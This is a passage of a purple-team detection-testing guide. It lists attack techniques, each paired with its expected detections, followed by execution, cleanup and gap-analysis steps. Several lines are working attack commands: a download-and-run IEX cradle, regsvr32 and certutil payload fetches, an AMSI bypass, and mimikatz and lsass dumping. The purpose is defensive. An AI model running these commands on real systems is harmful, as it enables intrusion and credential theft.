<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Base64 encoding</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$command = &quot;Write-Host &#x27;Test Detection&#x27;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$encoded = [Convert]::ToBase64String($bytes)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">powershell.exe -encodedCommand $encoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># String concatenation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$c1 = &quot;Write&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$c2 = &quot;-Host&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$c3 = &quot;&#x27;Evade Detection&#x27;&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IEX &quot;$c1$c2 $c3&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Invoke-Expression with download</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://test-server/script.ps1&#x27;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Expected Detections:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - Script Block Logging (Event ID 4104)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - Module Logging (Event ID 4103)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - EDR behavioral detection (suspicious script execution)</span><br></span></code></pre></div></div>
<p><strong>2. LOLBins (Living Off the Land Binaries):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MSBuild.exe (code execution)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft.NET</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Framework64</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">v4.0.30319</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">MSBuild.exe malicious.csproj</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Regsvr32.exe (COM scriptlet execution)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">regsvr32 /s /n /u /i:http://test-server/test.sct scrobj.dll</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CertUtil (file download)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">certutil </span><span class="token parameter variable" style="color:#36acaa">-urlcache</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-split</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> http://test-server/payload.exe payload.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Expected Detections:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Process creation from unusual parent (Sysmon Event ID 1)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Network connection from unexpected binary (Sysmon Event ID 3)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Command-line logging showing suspicious parameters</span><br></span></code></pre></div></div>
<p><strong>3. Process Injection:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># DLL Injection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># CreateRemoteThread API → inject DLL into target process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Process Hollowing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Create suspended process → replace memory → resume</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Reflective DLL Injection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Load DLL directly into memory (no disk artifacts)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Expected Detections:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Sysmon Event ID 8 (CreateRemoteThread)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Sysmon Event ID 10 (ProcessAccess with suspicious rights)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - EDR behavioral detection (memory allocation patterns)</span><br></span></code></pre></div></div>
<p><strong>4. AMSI Bypass:</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># AMSI (Anti-Malware Scan Interface) bypass techniques</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Reflection-based bypass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[Ref].Assembly.GetType(&#x27;System.Management.Automation.AmsiUtils&#x27;).GetField(&#x27;amsiInitFailed&#x27;,&#x27;NonPublic,Static&#x27;).SetValue($null,$true)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Expected Detections:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - Script Block Logging (full script content)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - EDR monitoring of AMSI tampering</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># - Memory scanning for known bypass patterns</span><br></span></code></pre></div></div>
<p><strong>5. Credential Dumping:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz.exe </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::logonpasswords&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Impacket secretsdump</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">secretsdump.py </span><span class="token parameter variable" style="color:#36acaa">-sam</span><span class="token plain"> sam.save </span><span class="token parameter variable" style="color:#36acaa">-system</span><span class="token plain"> system.save LOCAL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># ProcDump + Mimikatz (two-stage)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">procdump.exe </span><span class="token parameter variable" style="color:#36acaa">-accepteula</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-ma</span><span class="token plain"> lsass.exe lsass.dmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Transfer lsass.dmp offline, analyze with Mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Expected Detections:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Sysmon Event ID 10 (ProcessAccess to lsass.exe)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - EDR behavioral (credential access pattern)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Security Event 4656 (handle to LSASS)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-execution--monitoring">5. Execution &amp; Monitoring<a href="#5-execution--monitoring" class="hash-link" aria-label="Direct link to 5. Execution &amp; Monitoring" title="Direct link to 5. Execution &amp; Monitoring" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="execution-protocol">Execution Protocol<a href="#execution-protocol" class="hash-link" aria-label="Direct link to Execution Protocol" title="Direct link to Execution Protocol" translate="no">​</a></h3>
<p><strong>Pre-Execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 1. Verify test environment isolation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ping</span><span class="token plain"> production-server.example.com  </span><span class="token comment" style="color:#999988;font-style:italic"># Should fail</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Confirm monitoring is active</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Check SIEM/EDR console for heartbeat from test systems</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Notify SOC via designated channel</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;Purple Team Test START - Scenario: [NAME] - Expected Duration: [TIME]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. Start packet capture (if network testing)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tcpdump </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> eth0 </span><span class="token parameter variable" style="color:#36acaa">-w</span><span class="token plain"> test_capture.pcap</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 5. Document baseline state</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Get-Process </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> pre_test_processes.txt  </span><span class="token comment" style="color:#999988;font-style:italic"># Windows</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> aux </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> pre_test_processes.txt       </span><span class="token comment" style="color:#999988;font-style:italic"># Linux</span><br></span></code></pre></div></div>
<p><strong>During Execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Execute technique with detailed logging</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: PowerShell with transcript</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start-Transcript </span><span class="token parameter variable" style="color:#36acaa">-Path</span><span class="token plain"> C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">purple_team_test.log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># [Execute test technique]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Stop-Transcript</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Monitor for alerts in real-time</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - SIEM dashboard</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - EDR console</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Email/Slack notifications</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Document observations:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Time of execution </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UTC</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Command/tool used</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Alerts generated </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">alert ID, rule name, timestamp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- False positives triggered</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Detection gaps </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">no alert when expected</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><strong>Post-Execution:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 1. Execute cleanup procedures</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Remove-Item C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Temp</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">test_payload.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Remove-Item HKCU:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Software</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Test</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">PersistenceKey</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 2. Verify cleanup</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Get-ChildItem C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Temp</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">test_*  </span><span class="token comment" style="color:#999988;font-style:italic"># Should be empty</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 3. Collect telemetry</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Export SIEM alerts for test window</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Export EDR events for test endpoints</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Save packet capture</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 4. Notify SOC of test completion</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&quot;Purple Team Test END - Scenario: [NAME] - Review alerts and provide feedback&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 5. Restore snapshot if destructive testing occurred</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># VMware: Revert to snapshot &quot;pre_purple_test&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Hyper-V: Apply checkpoint</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="data-collection">Data Collection<a href="#data-collection" class="hash-link" aria-label="Direct link to Data Collection" title="Direct link to Data Collection" translate="no">​</a></h3>
<p><strong>Telemetry Sources to Review:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Windows Event Logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wevtutil epl Security C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Security_test.evtx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wevtutil epl System C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System_test.evtx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wevtutil epl </span><span class="token string" style="color:#e3116c">&quot;Microsoft-Windows-Sysmon/Operational&quot;</span><span class="token plain"> C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Sysmon_test.evtx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wevtutil epl </span><span class="token string" style="color:#e3116c">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span><span class="token plain"> C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logs</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">PowerShell_test.evtx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Linux Logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /var/log/syslog /evidence/syslog_test.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">cp</span><span class="token plain"> /var/log/auth.log /evidence/auth_test.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">journalctl </span><span class="token parameter variable" style="color:#36acaa">--since</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;2025-10-05 14:00:00&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--until</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;2025-10-05 15:00:00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> journalctl_test.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># EDR/SIEM Exports</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Export alerts matching test timeframe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Export raw events from test endpoints</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Document query used and export format</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="6-analysis--gap-identification">6. Analysis &amp; Gap Identification<a href="#6-analysis--gap-identification" class="hash-link" aria-label="Direct link to 6. Analysis &amp; Gap Identification" title="Direct link to 6. Analysis &amp; Gap Identification" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-coverage-analysis">Detection Coverage Analysis<a href="#detection-coverage-analysis" class="hash-link" aria-label="Direct link to Detection Coverage Analysis" title="Direct link to Detection Coverage Analysis" translate="no">​</a></h3>
<p><strong>For Each Tested Technique:</strong></p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Technique: T1059.001 (PowerShell)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Test Executed</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: Base64-encoded PowerShell command</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Command</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: </span><span class="token code-snippet code keyword" style="color:#00009f">`powershell.exe -encodedCommand [BASE64]`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Timestamp</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: 2025-10-05 14:32:15 UTC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Detection Results</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">✅ </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Detected by</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> EDR: Alert &quot;Suspicious PowerShell Execution&quot; (High confidence)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Sysmon: Event ID 1 (Process Creation) logged command line</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> PowerShell Script Block Logging: Event ID 4104 captured decoded script</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">❌ </span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Missed by</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> SIEM correlation rule (no alert generated)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Network monitoring (no DNS/HTTP activity to correlate)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Detection Quality</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> TTD (Time to Detect): 12 seconds</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> TTT (Time to Triage): 8 minutes (analyst reviewed alert)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Fidelity: High (low false positive history for this rule)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Context: Full command line captured, parent process identified</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Gap Analysis</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> SIEM rule not tuned for encoded PowerShell (only checks for &quot;-encodedCommand&quot; flag)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> No correlation with user behavior analytics (was this user expected to run PowerShell?)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Recommendations</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> Update SIEM rule to decode Base64 and 